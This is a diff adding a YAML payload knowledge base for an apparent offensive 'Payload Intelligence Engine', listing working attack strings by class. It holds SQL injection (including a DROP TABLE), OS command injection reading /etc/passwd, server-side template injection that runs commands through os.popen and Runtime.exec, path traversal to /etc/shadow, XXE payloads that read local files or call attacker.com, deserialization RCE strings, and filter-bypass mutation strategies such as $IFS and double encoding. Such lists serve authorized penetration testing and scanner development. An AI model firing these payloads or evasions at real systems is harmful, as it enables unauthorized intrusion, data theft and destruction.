@@ -1,0 +1,199 @@
+# Offensive Payload Knowledge Base
+# Used by MOD-11.5 Payload Intelligence Engine
+# Defines base payloads, mutation strategies, and encoding strategies
+
+payload_classes:
+
+  # ── SQL Injection ───────────────────────────────────────────────
+
+  - name: sql_injection
+    description: "SQL injection payloads for various DBMS"
+    payloads:
+      - "' OR 1=1--"
+      - "' OR '1'='1"
+      - "' UNION SELECT NULL--"
+      - "' UNION SELECT NULL,NULL--"
+      - "' UNION SELECT NULL,NULL,NULL--"
+      - "' AND SLEEP(5)--"
+      - "' AND 1=CONVERT(int,@@version)--"
+      - "'; DROP TABLE test--"
+      - "' OR 1=1#"
+      - "1' ORDER BY 1--"
+      - "') OR ('1'='1"
+      - "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"
+    mutations:
+      - inline_comments      # SELECT/**/ → SELECT
+      - case_variation        # or → OR → oR → Or
+      - whitespace_mutation   # spaces → tabs, newlines
+      - double_encoding       # encode twice
+      - concat_bypass         # CONCAT('S','ELECT')
+      - null_byte_injection   # %00 insertion
+    encodings:
+      - url                   # %27%20OR%201%3D1--
+      - double_url            # %2527%2520OR
+      - hex                   # 0x27204f522031
+      - unicode               # \u0027 OR
+      - base64                # encoded payload
+
+  # ── Command Injection ───────────────────────────────────────────
+
+  - name: command_injection
+    description: "OS command injection payloads"
+    payloads:
+      - "; id"
+      - "| id"
+      - "& id"
+      - "`id`"
+      - "$(id)"
+      - "; cat /etc/passwd"
+      - "| whoami"
+      - "&& whoami"
+      - "|| whoami"
+      - ";sleep 5"
+      - "| sleep 5"
+      - "$(sleep 5)"
+    mutations:
+      - whitespace_mutation
+      - variable_expansion    # $IFS instead of space
+      - wildcard_bypass       # /e?c/p?sswd
+      - newline_injection     # %0a before command
+      - pipe_variation        # | vs || vs |&
+    encodings:
+      - url
+      - double_url
+      - hex
+
+  # ── Template Injection ──────────────────────────────────────────
+
+  - name: template_injection
+    description: "Server-side template injection payloads"
+    payloads:
+      - "{{7*7}}"
+      - "${7*7}"
+      - "<%= 7*7 %>"
+      - "#{7*7}"
+      - "{{config}}"
+      - "{{self.__class__.__mro__}}"
+      - "${T(java.lang.Runtime).getRuntime().exec('id')}"
+      - "{{request.application.__globals__}}"
+      - "{% import os %}{{os.popen('id').read()}}"
+      - "{{''.__class__.__mro__[2].__subclasses__()}}"
+    mutations:
+      - case_variation
+      - whitespace_mutation
+      - unicode_bypass        # Unicode normalization tricks
+    encodings:
+      - url
+      - unicode
+      - hex
+
+  # ── Path Traversal ─────────────────────────────────────────────
+
+  - name: path_traversal
+    description: "Path traversal and local file inclusion payloads"
+    payloads:
+      - "../../../etc/passwd"
+      - "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+      - "....//....//....//etc/passwd"
+      - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+      - "..%252f..%252f..%252fetc%252fpasswd"
+      - "/etc/passwd%00"
+      - "....\\....\\....\\etc\\passwd"
+      - "/proc/self/environ"
+      - "/etc/shadow"
+      - "C:\\boot.ini"
+    mutations:
+      - double_encoding
+      - null_byte_injection
+      - dot_variation         # .. vs .... vs ..../
+      - slash_variation       # / vs \ vs %5c
+    encodings:
+      - url
+      - double_url
+      - unicode
+
+  # ── XXE ─────────────────────────────────────────────────────────
+
+  - name: xxe
+    description: "XML External Entity injection payloads"
+    payloads:
+      - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+      - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><foo>&xxe;</foo>'
+      - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>'
+      - '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>'
+    mutations:
+      - whitespace_mutation
+      - encoding_declaration  # UTF-16 BOM
+      - parameter_entity      # % entity vs & entity
+    encodings:
+      - url
+      - base64
+      - utf16
+
+  # ── Deserialization ─────────────────────────────────────────────
+
+  - name: deserialization
+    description: "Insecure deserialization payloads"
+    payloads:
+      - "O:4:\"Test\":0:\\{\\}"
+      - "rO0ABXNyABFqYXZhLmxhbmcuUnVudGltZQ=="
+      - "{\"__class__\": \"subprocess.Popen\", \"args\": [\"id\"]}"
+      - "pickle.loads(b\"cos\\nsystem\\n(S'id'\\ntR.\")"
+      - "{\"rce\": \"__import__('os').popen('id').read()\"}"
+    mutations:
+      - whitespace_mutation
+      - case_variation
+      - null_byte_injection
+    encodings:
+      - base64
+      - hex
+      - url
+
+# ── Mutation Strategy Definitions ─────────────────────────────────
+
+mutation_strategies:
+  inline_comments:
+    description: "Insert SQL comments between keywords"
+    example: "SELECT/**/ → SELECT"
+  case_variation:
+    description: "Randomize character casing"
+    example: "or → OR → oR → Or"
+  whitespace_mutation:
+    description: "Replace spaces with tabs, newlines, or encoded whitespace"
+    example: "' OR' → '\\tOR' or '%09OR'"
+  double_encoding:
+    description: "Apply URL encoding twice"
+    example: "' → %27 → %2527"
+  concat_bypass:
+    description: "Break keywords using string concatenation"
+    example: "SELECT → CONCAT('S','ELECT')"
+  null_byte_injection:
+    description: "Insert null bytes to bypass filters"
+    example: "payload%00.txt"
+  variable_expansion:
+    description: "Use shell variable expansion to bypass filters"
+    example: "cat$IFS/etc/passwd"
+  wildcard_bypass:
+    description: "Use wildcards to bypass string filters"
+    example: "/e?c/p?sswd"
+  newline_injection:
+    description: "Use newline characters to split commands"
+    example: "%0aid"
+  pipe_variation:
+    description: "Vary pipe operators"
+    example: "| vs || vs |&"
+  unicode_bypass:
+    description: "Use Unicode normalization tricks"
+    example: "＜script＞ (fullwidth)"
+  dot_variation:
+    description: "Vary dot-dot sequences"
+    example: ".. vs .... vs ....//"
+  slash_variation:
+    description: "Vary path separators"
+    example: "/ vs \\ vs %5c"
+  encoding_declaration:
+    description: "Vary XML encoding declaration"
+    example: "UTF-16 BOM prefix"
+  parameter_entity:
+    description: "Switch between parameter and general entities"
+    example: "% entity vs & entity"
